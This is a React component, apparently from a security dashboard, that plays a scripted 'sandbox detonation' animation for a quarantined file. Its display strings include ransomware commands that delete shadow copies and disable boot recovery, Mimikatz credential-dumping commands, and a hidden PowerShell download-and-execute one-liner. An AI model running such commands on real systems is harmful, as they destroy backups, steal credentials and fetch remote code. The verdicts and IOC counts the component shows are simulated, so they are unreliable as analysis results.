"use client";

import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  X,
  Play,
  Terminal,
  Activity,
  ShieldAlert,
  Server,
  Lock,
  Skull,
  ShieldCheck,
  Code2,
  AlertTriangle
} from "lucide-react";

export interface QuarantinedItem {
  id: string;
  name: string;
  hash: string;
  threatType: string;
  originalPath: string;
  quarantineDate: string;
  size: string;
}

interface SandboxModalProps {
  item: QuarantinedItem | null;
  onClose: () => void;
}

type SandboxState = "BOOTING" | "EXECUTING" | "REPORT";

export const SandboxDetonationModal: React.FC<SandboxModalProps> = ({ item, onClose }) => {
  const [sandboxState, setSandboxState] = useState<SandboxState>("BOOTING");
  const [terminalLines, setTerminalLines] = useState<string[]>([]);
  const [heuristics, setHeuristics] = useState<{ time: string; msg: string; type: "warn" | "crit" | "info" }[]>([]);
  
  const terminalRef = useRef<HTMLDivElement>(null);
  const heuristicsRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (!item) {
      setSandboxState("BOOTING");
      setTerminalLines([]);
      setHeuristics([]);
      return;
    }

    let isMounted = true;
    
    // Auto-scroll logic
    const scrollToBottom = (ref: React.RefObject<HTMLDivElement>) => {
      if (ref.current) {
        ref.current.scrollTop = ref.current.scrollHeight;
      }
    };

    // The sequence of events
    const runSimulation = async () => {
      const wait = (ms: number) => new Promise((res) => setTimeout(res, ms));
      const addTerm = (line: string) => {
        if (!isMounted) return;
        setTerminalLines(prev => [...prev, line]);
        setTimeout(() => scrollToBottom(terminalRef), 50);
      };
      const addHeur = (msg: string, type: "warn" | "crit" | "info") => {
        if (!isMounted) return;
        setHeuristics(prev => [...prev, { time: new Date().toISOString().substring(11, 23), msg, type }]);
        setTimeout(() => scrollToBottom(heuristicsRef), 50);
      };

      // 1. BOOTING
      setSandboxState("BOOTING");
      addTerm("[SYSTEM] Initializing Sentinel MicroVM v4.2.1...");
      await wait(400);
      addTerm("[SYSTEM] Allocating 2048MB RAM, 2 vCPU...");
      await wait(300);
      addTerm("[SYSTEM] Mounting immutable rootfs (windows_11_sandbox_base.img)...");
      addHeur("Sandbox VM allocated and isolated.", "info");
      await wait(600);
      addTerm("[SYSTEM] Establishing eBPF introspection hooks...");
      addHeur("Kernel telemetry hooks injected successfully.", "info");
      await wait(500);
      addTerm("[SYSTEM] VM Boot successful. Starting detonation sequence.");
      await wait(600);

      // 2. EXECUTING
      if (!isMounted) return;
      setSandboxState("EXECUTING");
      addTerm(`[SANDBOX] Injecting payload: ${item.name}`);
      await wait(400);
      addTerm(`[SANDBOX] Executing -> ${item.originalPath}`);
      addHeur(`Process created: ${item.name} (PID: 4912)`, "warn");
      
      await wait(800);
      if (item.threatType.toLowerCase().includes("ransom")) {
        // Ransomware sequence
        addTerm("C:\\> vssadmin.exe Delete Shadows /All /Quiet");
        addHeur("Attempted shadow copy deletion", "crit");
        await wait(500);
        addTerm("C:\\> bcdedit /set {default} recoveryenabled No");
        addTerm("C:\\> bcdedit /set {default} bootstatuspolicy ignoreallfailures");
        addHeur("Modified boot configuration (recovery disabled)", "crit");
        await wait(600);
        addTerm("[KERNEL] High I/O volume detected on C:\\Users\\*");
        addHeur("Mass file encryption initiated (AES-256 signatures)", "crit");
        await wait(900);
      } else if (item.name.toLowerCase().includes("mimikatz")) {
        // Mimikatz sequence
        addTerm("C:\\> privilege::debug");
        addHeur("Requested SeDebugPrivilege", "warn");
        await wait(500);
        addTerm("Privilege '20' OK");
        addTerm("C:\\> sekurlsa::logonpasswords");
        addHeur("Reading LSASS memory (Credential Dumping)", "crit");
        await wait(800);
        addTerm("Authentication Id : 0 ; 997 (00000000:000003e5)");
        addTerm("Session           : Service (0x5)");
        addHeur("Extracted NTLM hashes in memory", "crit");
        await wait(900);
      } else {
        // Cobalt Strike / generic beacon
        addTerm("C:\\> powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.0.0.5/a'))\"");
        addHeur("Obfuscated PowerShell execution", "warn");
        await wait(700);
        addTerm("[KERNEL] VirtualAllocEx called targeting explorer.exe");
        addHeur("Cross-process memory injection detected", "crit");
        await wait(600);
        addTerm("[NETWORK] SYN sent to 198.51.100.42:443");
        addHeur("C2 beaconing initiated over HTTPS", "crit");
        await wait(900);
      }

      addTerm("[SYSTEM] Detonation complete. Terminating MicroVM...");
      addHeur("VM Destroyed. Memory zeroed.", "info");
      await wait(1000);

      // 3. REPORT
      if (!isMounted) return;
      setSandboxState("REPORT");
    };

    runSimulation();

    return () => {
      isMounted = false;
    };
  }, [item]);

  if (!item) return null;

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-[60] flex items-center justify-center p-4 sm:p-6">
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="absolute inset-0 bg-black/90 backdrop-blur-md"
          onClick={onClose}
        />

        <motion.div
          initial={{ opacity: 0, scale: 0.95, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.95, y: 20 }}
          className="relative w-full max-w-6xl h-[85vh] bg-[#0A0C10] border border-purple-500/20 rounded-3xl shadow-2xl overflow-hidden flex flex-col"
        >
          {/* Ambient Glow */}
          <div className="absolute -top-40 -left-40 w-96 h-96 bg-purple-600/10 rounded-full blur-[100px] pointer-events-none" />
          <div className="absolute -bottom-40 -right-40 w-96 h-96 bg-rose-600/10 rounded-full blur-[100px] pointer-events-none" />

          {/* Header */}
          <div className="flex-none p-5 border-b border-white/[0.08] flex items-center justify-between z-10 bg-[#0A0C10]/80 backdrop-blur-xl">
            <div className="flex items-center gap-4">
              <div className="w-12 h-12 rounded-2xl bg-purple-950/50 border border-purple-500/30 flex items-center justify-center shadow-lg">
                {sandboxState === "BOOTING" ? (
                  <Server className="w-6 h-6 text-purple-400 animate-pulse" />
                ) : sandboxState === "EXECUTING" ? (
                  <Activity className="w-6 h-6 text-rose-400 animate-pulse" />
                ) : (
                  <ShieldCheck className="w-6 h-6 text-emerald-400" />
                )}
              </div>
              <div>
                <h2 className="text-xl font-bold text-white tracking-tight flex items-center gap-3">
                  MicroVM Sandbox Analysis
                  <span className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded border ${
                    sandboxState === "REPORT" ? "border-emerald-500/50 text-emerald-400 bg-emerald-950/50" : "border-amber-500/50 text-amber-400 bg-amber-950/50 animate-pulse"
                  }`}>
                    {sandboxState}
                  </span>
                </h2>
                <div className="text-xs text-slate-400 font-mono mt-1">
                  Target: {item.name} • SHA-256: {item.hash.substring(0, 16)}...
                </div>
              </div>
            </div>
            <button
              onClick={onClose}
              className="w-10 h-10 rounded-xl bg-white/5 hover:bg-white/10 flex items-center justify-center transition-colors z-20 relative"
            >
              <X className="w-5 h-5 text-slate-400 pointer-events-none" />
            </button>
          </div>

          {/* Body */}
          <div className="flex-1 flex flex-col md:flex-row overflow-hidden z-10 relative">
            
            {/* LEFT: Live Terminal Execution */}
            <div className="flex-1 border-r border-white/[0.08] flex flex-col bg-black">
              <div className="flex-none bg-[#111317] border-b border-white/[0.04] p-3 flex items-center gap-2">
                <Terminal className="w-4 h-4 text-slate-500" />
                <span className="text-xs font-mono font-bold text-slate-400 uppercase tracking-widest">Guest OS Execution (Windows 11)</span>
              </div>
              <div 
                ref={terminalRef}
                className="flex-1 p-6 font-mono text-sm leading-relaxed overflow-y-auto custom-scrollbar pb-10"
              >
                {terminalLines.map((line, idx) => (
                  <div key={idx} className={`${
                    line.includes("[SYSTEM]") ? "text-purple-400/80 font-bold" :
                    line.includes("KERNEL") || line.includes("NETWORK") ? "text-amber-400" :
                    "text-green-400/90"
                  }`}>
                    {line}
                  </div>
                ))}
                {sandboxState !== "REPORT" && (
                  <div className="animate-pulse text-slate-500 mt-2">_</div>
                )}
              </div>
            </div>

            {/* RIGHT: Heuristics & Report */}
            <div className="flex-1 flex flex-col bg-[#0A0C10]">
              <div className="flex-none bg-[#111317] border-b border-white/[0.04] p-3 flex items-center gap-2">
                <Activity className="w-4 h-4 text-slate-500" />
                <span className="text-xs font-mono font-bold text-slate-400 uppercase tracking-widest">eBPF Heuristic Stream</span>
              </div>
              
              <div 
                ref={heuristicsRef}
                className="flex-1 p-6 overflow-y-auto custom-scrollbar space-y-3 pb-10"
              >
                {heuristics.map((heur, idx) => (
                  <motion.div 
                    initial={{ opacity: 0, x: 20 }}
                    animate={{ opacity: 1, x: 0 }}
                    key={idx} 
                    className={`p-3 rounded-xl border flex gap-3 ${
                      heur.type === "crit" ? "bg-rose-950/20 border-rose-500/30" :
                      heur.type === "warn" ? "bg-amber-950/20 border-amber-500/30" :
                      "bg-blue-950/20 border-blue-500/30"
                    }`}
                  >
                    <div className="shrink-0 mt-0.5">
                      {heur.type === "crit" ? <Skull className="w-4 h-4 text-rose-500" /> :
                       heur.type === "warn" ? <AlertTriangle className="w-4 h-4 text-amber-500" /> :
                       <ShieldCheck className="w-4 h-4 text-blue-500" />}
                    </div>
                    <div>
                      <div className="text-[10px] font-mono text-slate-500 mb-0.5">{heur.time}</div>
                      <div className={`text-sm font-bold ${
                        heur.type === "crit" ? "text-rose-100" :
                        heur.type === "warn" ? "text-amber-100" :
                        "text-blue-100"
                      }`}>
                        {heur.msg}
                      </div>
                    </div>
                  </motion.div>
                ))}

                {/* Final Report */}
                {sandboxState === "REPORT" && (
                  <motion.div 
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.5 }}
                    className="mt-8 p-6 rounded-2xl bg-gradient-to-br from-rose-950/40 to-black border border-rose-500/30 shadow-2xl"
                  >
                    <h3 className="text-lg font-bold text-white mb-4 flex items-center gap-2">
                      <ShieldAlert className="w-5 h-5 text-rose-500" />
                      Final Detonation Verdict
                    </h3>
                    
                    <div className="grid grid-cols-2 gap-4 mb-6">
                      <div className="p-4 bg-black/40 rounded-xl border border-white/[0.04]">
                        <div className="text-[10px] text-slate-500 font-mono uppercase">Threat Score</div>
                        <div className="text-3xl font-bold text-rose-500">98<span className="text-sm text-slate-500">/100</span></div>
                      </div>
                      <div className="p-4 bg-black/40 rounded-xl border border-white/[0.04]">
                        <div className="text-[10px] text-slate-500 font-mono uppercase">Classification</div>
                        <div className="text-sm font-bold text-rose-400 mt-2">{item.threatType}</div>
                      </div>
                    </div>

                    <div className="space-y-2 text-sm text-slate-300">
                      <p><strong>Verdict:</strong> Malicious behavior confirmed in sandbox.</p>
                      <p><strong>Action Taken:</strong> Payload remains permanently locked in Quarantine Vault.</p>
                      <p><strong>IOCs:</strong> Generated 4 new Network Indicators, 12 File Hashes.</p>
                    </div>

                    <button 
                      onClick={onClose}
                      className="w-full mt-6 py-3 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-white font-bold transition-colors cursor-pointer z-20 relative"
                    >
                      Acknowledge Report
                    </button>
                  </motion.div>
                )}
              </div>
            </div>

          </div>
        </motion.div>
      </div>
    </AnimatePresence>
  );
};
